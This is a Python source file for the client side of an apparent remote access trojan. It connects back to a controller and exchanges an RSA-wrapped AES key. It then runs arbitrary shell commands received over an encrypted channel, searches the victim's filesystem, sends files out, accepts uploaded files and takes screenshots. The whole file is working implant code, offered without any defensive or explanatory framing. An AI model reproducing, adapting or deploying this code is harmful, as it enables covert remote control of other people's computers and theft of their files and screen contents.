import os
import socket
import subprocess
from threading import Thread
from helper_methods import *
import time


class Client(Thread):
    def __init__(self, IP: str, Port: int):
        self.conn = socket.socket()
        self.IP = IP
        self.Port = Port
        print(f"Trying to connect to {self.IP} in port {self.Port}")
        while True:
            try:
                self.conn.connect((IP, Port))
                break
            except Exception:
                sleep_for = random.randrange(1, 10)
                time.sleep(sleep_for)
                continue
        while True:
            try:
                AES_KEY = self.conn.recv(1024)
                self.AES_KEY = RSAFunc_client(AES_KEY).encode('ISO-8859-1',
                                                              errors='ignore')  # Receiving the AES key encrypted in RSA.
                res = encrypt_client(os.getcwd().encode('ISO-8859-1', errors='ignore'), self.AES_KEY)
                self.conn.send(res)
                self.start_time = time.time()
                self.timer = Thread(target=self.check_time).start()
                break
            except Exception:
                continue

    def transfer(self, path):
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(1024)
            while len(packet) > 0:
                self.conn.send(packet)
                packet = f.read(1024)
            self.conn.send('DONE'.encode('ISO-8859-1', errors='ignore'))
        else:
            self.conn.send('File not found'.encode('ISO-8859-1', errors='ignore'))

    def download(self, command):
        f = open(command, 'wb')
        while True:
            bits = self.conn.recv(1024)
            if bits.endswith('DONE'.encode('ISO-8859-1', errors='ignore')):
                f.write(bits[:-4])
                f.close()
                print('[+] Transfer completed ')
                break
            if 'File not found'.encode('ISO-8859-1', errors='ignore') in bits:
                print('[-] Unable to find out the file')
                break
            f.write(bits)

    def run(self):
        while True:
            try:
                command = decrypt_client(self.conn.recv(1024), self.AES_KEY)
                self.start_time = time.time()
                print(command)
            except ConnectionResetError:
                self.__init__(self.IP, self.Port)
                continue
            if 'help' in command.decode('ISO-8859-1', errors='ignore'):
                st = 'Possible commands:\n 1) CMD commands\n 2) searchd Space PATH - searches for subdirectories in given path.\n 3) ' \
     'searchf Space PATH*File_name searches for file in a given path.\n 4) search Space PATH*file_extension - ' \
     'searches all files with the extension in path.\n 5) screenshot - takes a screenshot of the remote server and ' \
     'sends the file to the Web server.\n 6) download/grab*PATH of File - downloads a file from the remote server. \n ' \
     '7) Upload*PATH uploads a file to the remote server.'
                self.conn.send(encrypt_client(str(len(st)).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
                self.conn.send(encrypt_client(
                 st.encode('ISO-8859-1', errors='ignore'),
                    self.AES_KEY))
            elif 'cd' in command.decode('ISO-8859-1', errors='ignore'):
                command, path = command.decode('ISO-8859-1', errors='ignore')[0], list_to_path(
                    command.decode('ISO-8859-1', errors='ignore').split(' ')[1:])
                try:
                    os.chdir(path)
                    self.conn.send(
                        encrypt_client(f'[+] CWD is {os.getcwd()}'.encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
                except Exception as e:
                    self.conn.send(encrypt_client(('[-]' + str(e)).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
                    print("Could not enter this path.")
            elif 'grab' in command.decode('ISO-8859-1', errors='ignore') or 'download' in command.decode('ISO-8859-1',
                                                                                                         errors='ignore'):
                grab, path = command.decode('ISO-8859-1', errors='ignore').split("*")
                try:
                    self.transfer(path)
                except Exception:
                    pass
            elif 'upload' in command.decode('ISO-8859-1', errors='ignore') or 'send' in command.decode('ISO-8859-1',
                                                                                                       errors='ignore'):
                send, path = command.decode('ISO-8859-1', errors='ignore').split("*")
                self.download(path)
            elif 'screenshot' in command.decode('ISO-8859-1', errors='ignore'):
                path = screenshot()
                try:
                    self.transfer(path)
                except Exception as e:
                    print(e)
                    raise
            elif 'searchd' in command.decode('ISO-8859-1', errors='ignore'):
                path = command.decode()[8:]
                lists = ''
                for dir_path, dir_name, file_names in os.walk(path):
                    for name in dir_name:
                        lists += '\n' + os.path.abspath(name)
                print(lists)
                if lists == '':
                    lists = 'No directories were found in the given path.'
                length = len(lists)
                self.conn.send(encrypt_client(str(length).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
                self.conn.send(encrypt_client(lists.encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
            elif 'searchf' in command.decode('ISO-8859-1', errors='ignore'):
                command = command.decode('ISO-8859-1', errors='ignore')[8:]
                path, file_name = command.split('*')  # searchf c:/*abc.pdf -> ['c:/', 'abc.pdf']
                lists = ''
                for dir_path, dir_name, file_names in os.walk(path):
                    for file in file_names:
                        if file == file_name:
                            lists = '\n' + os.path.abspath(file)
                print(lists)
                if lists == '':
                    lists = 'No match was found in the given path.'
                length = len(lists)
                self.conn.send(encrypt_client(str(length).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
                self.conn.send(encrypt_client(lists.encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
            elif 'search' in command.decode('ISO-8859-1', errors='ignore'):
                command = command.decode('ISO-8859-1', errors='ignore')[7:]
                path, ext = command.split('*')  # search c:/*.pdf -> ['c:/', '.pdf']
                lists = ''
                for dir_path, dir_name, file_names in os.walk(path):
                    for file in file_names:
                        if file.endswith(ext):
                            lists += '\n' + os.path.join(dir_path, file)
                print(lists)
                if lists == '':
                    lists = 'No match was found in the given path.'
                length = len(lists)
                self.conn.send(encrypt_client(str(length).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
                self.conn.send(encrypt_client(lists.encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
            else:
                try:
                    output = subprocess.check_output(command.decode('ISO-8859-1', errors='ignore'), timeout=0.5,
                                                     shell=True)
                    print("Output: ", output)
                    self.conn.send(encrypt_client(str(len(output)).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
                    self.conn.send(encrypt_client(output, self.AES_KEY))
                except Exception as e:
                    print(e)
                    try:
                        CMD = subprocess.Popen(command.decode('ISO-8859-1', errors='ignore'), shell=True,
                                               stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE
                                               )
                        print(CMD)
                        output, errors = CMD.communicate(timeout=15)
                        new_output = output + errors
                        if new_output == '':
                            new_output = 'No output came from this command'
                        self.conn.send(
                            encrypt_client(
                                str(len(encrypt_client(new_output,
                                                       self.AES_KEY))).encode(
                                    'ISO-8859-1', errors='ignore'), self.AES_KEY))
                        self.conn.send(encrypt_client(new_output, self.AES_KEY))
                    except subprocess.TimeoutExpired:
                        new_output = ''
                        self.conn.send(
                            encrypt_client(
                                str(len(encrypt_client(new_output,
                                                       self.AES_KEY))).encode(
                                    'ISO-8859-1', errors='ignore'), self.AES_KEY))
                        self.conn.send(encrypt_client(new_output, self.AES_KEY))
    def check_time(self):
        while True:
            if time.time() - self.start_time > 120:
                self.conn.shutdown(socket.SHUT_RDWR)
                exit()

def main():
    client = Client("127.0.0.1", 9999)
    client.run()


if __name__ == '__main__':
    main()
